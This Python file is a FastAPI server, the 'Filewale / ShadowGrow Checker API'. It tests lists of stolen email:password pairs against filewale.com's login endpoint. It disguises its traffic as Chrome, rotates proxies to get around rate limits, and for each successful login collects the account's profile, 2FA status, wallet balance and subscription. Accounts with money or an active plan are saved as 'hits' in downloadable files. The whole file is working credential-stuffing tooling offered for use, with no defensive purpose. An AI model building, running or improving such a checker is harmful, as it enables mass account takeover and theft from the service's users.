#!/usr/bin/env python3
"""
Filewale / ShadowGrow API server (v2.1) — Render-ready.

Endpoints:
    GET  /health
    GET  /config
    POST /check                               { combo, proxy? }         -> Result
    POST /bulk                                { combos, proxies? }      -> { job_id }
    POST /bulk/file                           multipart txt/csv         -> { job_id }
    GET  /jobs                                -> list summary
    GET  /jobs/{id}[?include_items=1]         -> job snapshot
    GET  /jobs/{id}/download/{kind}           -> hits|free|bad|errors

Proxy mode semantics on /bulk and /bulk/file:
    proxies omitted  -> use API's proxies.txt (fallback direct if empty)
    proxies: []      -> force direct
    proxies: [...]   -> use supplied list

Env vars (all optional):
    FILEWALE_PORT            (default 8000; Render injects PORT — honored)
    FILEWALE_CONFIG          (default filewale_config.ini)
    FILEWALE_RESULTS_ROOT    (default filewale_results)
    FILEWALE_PROXIES_FILE    (default proxies.txt)
"""

import os
import sys
import time
import json
import uuid
import random
import threading
import configparser
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional, List

try:
    from curl_cffi import requests as cf_requests
except ImportError:
    sys.exit("[!] pip install curl_cffi")

try:
    from fastapi import FastAPI, HTTPException, UploadFile, File
    from fastapi.responses import FileResponse, JSONResponse
    from pydantic import BaseModel, Field
    import uvicorn
except ImportError:
    sys.exit("[!] pip install fastapi uvicorn python-multipart pydantic")


BASE = "https://filewale.com"
API = BASE + "/api/v1"
PANEL_NAME = "Filewale / ShadowGrow"

CONFIG_FILE = os.getenv("FILEWALE_CONFIG", "filewale_config.ini")
RESULTS_ROOT = os.getenv("FILEWALE_RESULTS_ROOT", "filewale_results")
DEFAULT_PROXIES = os.getenv("FILEWALE_PROXIES_FILE", "proxies.txt")


# ==================== CONFIG ====================
class Config:
    def __init__(self):
        self.cp = configparser.ConfigParser()
        if not os.path.exists(CONFIG_FILE):
            self._create()
        self.cp.read(CONFIG_FILE)
        self._parse()

    def _create(self):
        self.cp["General"] = {
            "threads": "3",
            "timeout": "30",
            "retries": "2",
            "retry_delay": "2.0",
            "combo_delay": "0.3",
            "login_rate_per_min": "25",
            "proxies_file": DEFAULT_PROXIES,
            "save_free": "true",
            "fetch_plan": "true",
            "fetch_user": "true",
        }
        with open(CONFIG_FILE, "w") as f:
            self.cp.write(f)

    def _parse(self):
        c = self.cp["General"]
        self.threads = max(1, min(20, c.getint("threads", 3)))
        self.timeout = max(5, min(120, c.getint("timeout", 30)))
        self.retries = max(0, min(5, c.getint("retries", 2)))
        self.retry_delay = max(0.0, min(60.0, c.getfloat("retry_delay", 2.0)))
        self.combo_delay = max(0.0, min(60.0, c.getfloat("combo_delay", 0.3)))
        self.login_rate_per_min = max(1, min(500, c.getint("login_rate_per_min", 25)))
        self.proxies_file = c.get("proxies_file", DEFAULT_PROXIES)
        self.save_free = c.getboolean("save_free", True)
        self.fetch_plan = c.getboolean("fetch_plan", True)
        self.fetch_user = c.getboolean("fetch_user", True)

    def as_dict(self):
        return {
            "threads": self.threads, "timeout": self.timeout,
            "retries": self.retries, "retry_delay": self.retry_delay,
            "combo_delay": self.combo_delay,
            "login_rate_per_min": self.login_rate_per_min,
            "proxies_file": self.proxies_file,
            "save_free": self.save_free,
            "fetch_plan": self.fetch_plan,
            "fetch_user": self.fetch_user,
        }


CFG = Config()


# ==================== RATE LIMITER ====================
class RateLimiter:
    def __init__(self, rate_per_min):
        self.rate = float(rate_per_min)
        self.tokens = float(rate_per_min)
        self.last = time.time()
        self.lock = threading.Lock()

    def acquire(self):
        while True:
            with self.lock:
                now = time.time()
                self.tokens = min(self.rate, self.tokens + (now - self.last) * (self.rate / 60.0))
                self.last = now
                if self.tokens >= 1:
                    self.tokens -= 1
                    return
                wait = (1 - self.tokens) / (self.rate / 60.0)
            time.sleep(wait)


LOGIN_LIMITER = RateLimiter(CFG.login_rate_per_min)


# ==================== PROXIES ====================
def load_proxies():
    if not os.path.isfile(CFG.proxies_file):
        return []
    out = []
    with open(CFG.proxies_file, "r", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if not line.startswith("http"):
                line = "http://" + line
            out.append(line)
    return list(dict.fromkeys(out))


_pool = []
_bad = set()
_plock = threading.Lock()


def set_pool(proxies):
    global _pool
    with _plock:
        _pool = list(proxies)
        _bad.clear()


def pick_proxy():
    with _plock:
        avail = [p for p in _pool if p not in _bad]
        if not avail and _pool:
            _bad.clear()
            avail = list(_pool)
    return random.choice(avail) if avail else None


def mark_bad(p):
    if not p:
        return
    with _plock:
        _bad.add(p)


def proxy_count():
    with _plock:
        return len(_pool)


# ==================== COMBO PARSE ====================
def parse_combos(text):
    out = set()
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or ":" not in line:
            continue
        u, _, p = line.partition(":")
        u, p = u.strip(), p.strip()
        if u and p:
            out.add(f"{u}:{p}")
    return sorted(out)


# ==================== RESULT ====================
class Result:
    def __init__(self, status, combo, info=None, err=""):
        self.status = status
        self.combo = combo
        self.info = info or {}
        self.err = err

    def to_dict(self):
        return {"status": self.status, "combo": self.combo,
                "info": self.info, "error": self.err}


# ==================== CHECK ====================
def check_account(email, password, proxy=None):
    combo = f"{email}:{password}"
    s = cf_requests.Session(impersonate="chrome", timeout=CFG.timeout)
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}

    try:
        LOGIN_LIMITER.acquire()

        try:
            r = s.post(API + "/auth/login", json={
                "identifier": email, "password": password,
            }, headers={
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "origin": BASE, "referer": BASE + "/login",
            })
        except Exception as e:
            return Result("error", combo, err=f"net_{type(e).__name__}")

        if r.status_code == 429:
            try:
                wait = max(1, int(r.headers.get("ratelimit-reset", "0")) - int(time.time()))
            except Exception:
                wait = 30
            return Result("error", combo, err=f"rate_limit|wait={wait}")

        if r.status_code in (401, 403):
            return Result("bad", combo, err=f"http_{r.status_code}")
        if r.status_code != 200:
            return Result("error", combo, err=f"http_{r.status_code}")

        try:
            body = r.json()
        except Exception:
            return Result("error", combo, err="bad_json")

        if not body.get("success"):
            return Result("bad", combo, err="success_false")

        token = (body.get("data") or {}).get("accessToken")
        if not token:
            return Result("bad", combo, err="no_token")

        user = (body.get("data") or {}).get("user") or {}
        auth = {"authorization": f"Bearer {token}"}

        if CFG.fetch_user:
            try:
                ru = s.get(API + "/users/me", headers={
                    **auth,
                    "accept": "application/json, text/plain, */*",
                    "referer": BASE + "/dashboard",
                    "x-shadowgrow-auth-critical": "1",
                })
                if ru.status_code == 401:
                    return Result("bad", combo, err="token_rejected")
                if ru.status_code == 200:
                    uj = ru.json()
                    if uj.get("success") and uj.get("data"):
                        user = uj["data"]
            except Exception:
                pass

        balance = None
        currency = "USD"
        balance_extra = {}
        try:
            rb = s.get(API + "/wallet/me/balance", headers={
                **auth,
                "accept": "application/json, text/plain, */*",
                "referer": BASE + "/dashboard/wallet",
            })
            if rb.status_code == 200:
                bj = rb.json()
                bd = bj.get("data") or {}
                balance = bd.get("balance")
                currency = bd.get("currency", "USD")
                balance_extra = bd
        except Exception:
            pass

        plan = None
        if CFG.fetch_plan:
            try:
                rp = s.get(API + "/subscriptions/my-subscription", headers={
                    **auth,
                    "accept": "application/json, text/plain, */*",
                    "referer": BASE + "/dashboard",
                })
                if rp.status_code == 200:
                    pj = rp.json()
                    if pj.get("success") and pj.get("data"):
                        plan = pj["data"]
            except Exception:
                pass

        info = {
            "panel": PANEL_NAME, "email": email,
            "username": user.get("username", email.split("@")[0]),
            "user_id": user.get("id"), "full_name": user.get("fullName"),
            "country": user.get("country"), "city": user.get("city"),
            "twofa": user.get("isTwoFactorEnabled"),
            "email_verified": user.get("emailVerified"),
            "phone_verified": user.get("mobileVerified"),
            "created_at": user.get("createdAt"),
            "balance": balance, "currency": currency,
            "available": balance_extra.get("availableBalance"),
            "locked": balance_extra.get("lockedAmount"),
            "total_credited": balance_extra.get("totalCredited"),
            "total_debited": balance_extra.get("totalDebited"),
        }

        if plan:
            p = plan.get("plan") or {}
            info.update({
                "plan_name": p.get("name", "-"),
                "plan_status": plan.get("status", "-"),
                "plan_start": plan.get("startDate"),
                "plan_end": plan.get("endDate"),
                "plan_price": p.get("price"),
                "plan_currency": p.get("currency", currency),
                "plan_max_downloads": p.get("maxDownloads"),
                "plan_max_bandwidth": p.get("maxBandwidthGB"),
                "plan_max_devices": p.get("maxDevices"),
                "plan_daily_dl": p.get("dailyDownloadLimit"),
                "plan_daily_bw": p.get("dailyBandwidthLimitGB"),
                "used_downloads": plan.get("downloadCount", 0),
                "used_bandwidth": plan.get("bandwidthUsedGB", "0"),
            })

        reasons = []
        if balance is not None and balance > 0:
            reasons.append("balance")
        if plan and plan.get("status") == "active":
            reasons.append("plan")
        info["reasons"] = ",".join(reasons) if reasons else "none"

        return Result("hit" if reasons else "free", combo, info=info)

    except Exception as e:
        return Result("error", combo, err=f"crash_{type(e).__name__}")
    finally:
        try:
            s.close()
        except Exception:
            pass


def check_with_retries(combo, proxy):
    email, _, password = combo.partition(":")
    attempts = CFG.retries + 1
    last = None

    for _ in range(attempts):
        r = check_account(email, password, proxy=proxy)
        if r.status in ("hit", "free", "bad"):
            return r
        last = r
        err = r.err

        if err.startswith("rate_limit"):
            try:
                wait = int(err.split("wait=")[1])
            except Exception:
                wait = 30
            time.sleep(min(wait, 60))
            if proxy:
                mark_bad(proxy)
            proxy = pick_proxy()
            continue

        if err.startswith("net_") or err.startswith("crash_"):
            if proxy:
                mark_bad(proxy)
            proxy = pick_proxy()
            time.sleep(CFG.retry_delay)
            continue

        time.sleep(CFG.retry_delay)

    return last or Result("error", combo, err="no_result")


# ==================== JOB ====================
class Job:
    def __init__(self, total, kind, proxy_mode):
        self.id = uuid.uuid4().hex[:12]
        self.kind = kind
        self.proxy_mode = proxy_mode
        self.total = total
        self.done = 0
        self.hits = 0
        self.free = 0
        self.bad = 0
        self.err = 0
        self.state = "running"
        self.started = time.time()
        self.finished = None
        self.folder = os.path.join(
            RESULTS_ROOT,
            f"{kind}_{self.id}_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}",
        )
        os.makedirs(self.folder, exist_ok=True)
        self.files = {
            "hits": open(os.path.join(self.folder, "hits.txt"), "w", encoding="utf-8"),
            "free": (
                open(os.path.join(self.folder, "free.txt"), "w", encoding="utf-8")
                if CFG.save_free else None
            ),
            "bad": open(os.path.join(self.folder, "bad.txt"), "w", encoding="utf-8"),
            "errors": open(os.path.join(self.folder, "errors.txt"), "w", encoding="utf-8"),
        }
        self.items = []
        self.lock = threading.Lock()

    def _w(self, key, line):
        f = self.files.get(key)
        if f is None:
            return
        with self.lock:
            try:
                f.write(line + "\n")
                f.flush()
            except Exception:
                pass

    def _fmt(self, combo, info):
        parts = [combo, f"Panel={info.get('panel', 'Filewale')}"]
        if info.get("username"):
            parts.append(f"User={info['username']}")
        if info.get("balance") is not None:
            parts.append(f"Balance={info['balance']} {info.get('currency', 'USD')}")
        if info.get("plan_name"):
            end = (info.get("plan_end") or "")[:10]
            parts.append(f"Plan={info['plan_name']} [{info.get('plan_status', '?')} until {end}]")
            parts.append(f"DL={info.get('used_downloads', 0)}/{info.get('plan_max_downloads', '?')}")
            parts.append(f"BW={info.get('used_bandwidth', '0')}/{info.get('plan_max_bandwidth', '?')}GB")
        if info.get("country"):
            parts.append(f"Country={info['country']}")
        if info.get("twofa") is not None:
            parts.append(f"2FA={info['twofa']}")
        parts.append(f"Reason={info.get('reasons', 'none')}")
        return " | ".join(parts)

    def record(self, r: Result):
        with self.lock:
            self.done += 1
            if r.status == "hit":
                self.hits += 1
                self._w("hits", self._fmt(r.combo, r.info))
            elif r.status == "free":
                self.free += 1
                self._w("free", self._fmt(r.combo, r.info))
            elif r.status == "bad":
                self.bad += 1
                self._w("bad", r.combo)
            else:
                self.err += 1
                self._w("errors", f"{r.combo} | {r.err}")
            if len(self.items) < 5000:
                self.items.append(r.to_dict())

    def finish(self):
        with self.lock:
            self.state = "done"
            self.finished = time.time()
        for f in self.files.values():
            if f is not None:
                try:
                    f.close()
                except Exception:
                    pass

    def snapshot(self, include_items=False):
        with self.lock:
            el = (self.finished or time.time()) - self.started
            data = {
                "job_id": self.id, "kind": self.kind,
                "proxy_mode": self.proxy_mode,
                "state": self.state, "total": self.total, "done": self.done,
                "hits": self.hits, "free": self.free, "bad": self.bad,
                "errors": self.err,
                "elapsed_seconds": round(el, 1),
                "cpm": int(self.done / max(1, el) * 60),
                "folder": self.folder,
                "files": {k: (f.name if f else None) for k, f in self.files.items()},
            }
            if include_items:
                data["items"] = list(self.items)
            return data


JOBS = {}
JOBS_LOCK = threading.Lock()


def _bulk_worker(job: Job, combos: List[str]):
    try:
        with ThreadPoolExecutor(max_workers=CFG.threads) as ex:
            futures = []
            for combo in combos:
                proxy = pick_proxy() if _pool else None
                futures.append(ex.submit(check_with_retries, combo, proxy))
                if CFG.combo_delay > 0:
                    time.sleep(CFG.combo_delay)
            for fut in as_completed(futures):
                try:
                    r = fut.result()
                except Exception as e:
                    r = Result("error", "?", err=f"future_{type(e).__name__}")
                job.record(r)
    finally:
        job.finish()


# ==================== FASTAPI ====================
app = FastAPI(title="Filewale Checker API", version="2.1.0")


class SingleReq(BaseModel):
    combo: str = Field(..., description="email:password")
    proxy: Optional[str] = None


class BulkReq(BaseModel):
    combos: List[str] = Field(..., description="list of email:password")
    proxies: Optional[List[str]] = Field(
        None,
        description="omit=use proxies.txt; []=direct; [..]=use these",
    )


def _apply_proxy_mode(proxies: Optional[List[str]]) -> str:
    if proxies is None:
        set_pool(load_proxies())
    else:
        set_pool(proxies)
    n = proxy_count()
    return f"pool×{n}" if n else "direct"


@app.get("/")
def root():
    return {"ok": True, "panel": PANEL_NAME, "docs": "/docs",
            "endpoints": ["/health", "/config", "/check", "/bulk",
                          "/bulk/file", "/jobs", "/jobs/{id}"]}


@app.get("/health")
def health():
    return {"ok": True, "panel": PANEL_NAME,
            "time": datetime.utcnow().isoformat() + "Z",
            "proxies": proxy_count(),
            "jobs_active": sum(1 for j in JOBS.values() if j.state == "running")}


@app.get("/config")
def get_config():
    return CFG.as_dict()


@app.post("/check")
def api_check(req: SingleReq):
    combo = req.combo.strip()
    if ":" not in combo:
        raise HTTPException(400, "combo must be email:password")

    email, _, password = combo.partition(":")
    proxy = req.proxy or (pick_proxy() if _pool else None)
    r = check_with_retries(f"{email}:{password}", proxy)

    if r.status in ("hit", "free"):
        os.makedirs(RESULTS_ROOT, exist_ok=True)
        with open(os.path.join(RESULTS_ROOT, "singles.jsonl"), "a", encoding="utf-8") as f:
            f.write(json.dumps(r.to_dict()) + "\n")

    return r.to_dict()


@app.post("/bulk")
def api_bulk(req: BulkReq):
    combos = parse_combos("\n".join(req.combos))
    if not combos:
        raise HTTPException(400, "no valid combos")

    mode = _apply_proxy_mode(req.proxies)
    job = Job(total=len(combos), kind="bulk", proxy_mode=mode)
    with JOBS_LOCK:
        JOBS[job.id] = job

    t = threading.Thread(target=_bulk_worker, args=(job, combos), daemon=True)
    t.start()
    return {"job_id": job.id, "total": len(combos),
            "proxies": proxy_count(), "proxy_mode": mode}


@app.post("/bulk/file")
async def api_bulk_file(file: UploadFile = File(...), direct: bool = False):
    raw = await file.read()
    try:
        text = raw.decode("utf-8", errors="ignore")
    except Exception:
        raise HTTPException(400, "unreadable file")

    combos = parse_combos(text)
    if not combos:
        raise HTTPException(400, "no valid combos in file")

    mode = _apply_proxy_mode([] if direct else None)
    job = Job(total=len(combos), kind="bulk", proxy_mode=mode)
    with JOBS_LOCK:
        JOBS[job.id] = job

    t = threading.Thread(target=_bulk_worker, args=(job, combos), daemon=True)
    t.start()
    return {"job_id": job.id, "total": len(combos),
            "proxies": proxy_count(), "proxy_mode": mode}


@app.get("/jobs")
def api_jobs():
    with JOBS_LOCK:
        return [
            {"job_id": j.id, "kind": j.kind, "state": j.state,
             "done": j.done, "total": j.total, "hits": j.hits,
             "proxy_mode": j.proxy_mode}
            for j in JOBS.values()
        ]


@app.get("/jobs/{job_id}")
def api_job(job_id: str, include_items: bool = False):
    job = JOBS.get(job_id)
    if not job:
        raise HTTPException(404, "job not found")
    return job.snapshot(include_items=include_items)


@app.get("/jobs/{job_id}/download/{kind}")
def api_download(job_id: str, kind: str):
    job = JOBS.get(job_id)
    if not job:
        raise HTTPException(404, "job not found")
    f = job.files.get(kind)
    if not f or not os.path.isfile(f.name):
        raise HTTPException(404, f"file '{kind}' not available")
    return FileResponse(f.name, filename=f"{job_id}_{kind}.txt",
                        media_type="text/plain")


# ==================== ENTRY ====================
if __name__ == "__main__":
    os.makedirs(RESULTS_ROOT, exist_ok=True)
    set_pool(load_proxies())
    port = int(os.getenv("PORT", os.getenv("FILEWALE_PORT", "8000")))
    uvicorn.run(app, host="0.0.0.0", port=port, log_level="info")